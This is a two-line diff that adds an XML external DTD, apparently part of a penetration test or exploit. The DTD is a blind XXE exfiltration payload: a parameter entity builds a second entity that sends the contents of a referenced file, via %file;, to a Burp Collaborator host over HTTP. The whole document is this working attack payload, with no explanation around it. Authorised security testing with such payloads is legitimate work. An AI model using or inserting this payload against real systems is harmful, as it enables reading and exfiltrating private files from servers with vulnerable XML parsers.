@@ -1,0 +1,2 @@
+<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://9z9qxipkdauvei9pgpo8yroin9tzho.burpcollaborator.net/?%file;'>">
+%start;
